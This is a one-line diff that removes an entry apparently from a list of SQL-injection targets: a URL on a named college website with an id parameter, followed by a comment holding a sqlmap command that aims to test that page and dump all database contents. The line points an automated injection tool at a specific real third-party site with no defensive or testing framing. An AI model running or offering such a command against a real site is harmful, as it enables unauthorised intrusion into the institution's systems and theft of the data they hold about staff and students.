@@ -1,1 +1,0 @@
-https://www.jspmicoer.edu.in/faculty_profile.php?id=5 (GET)  # sqlmap.py -u https://www.jspmicoer.edu.in/faculty_profile.php?id=5 --all
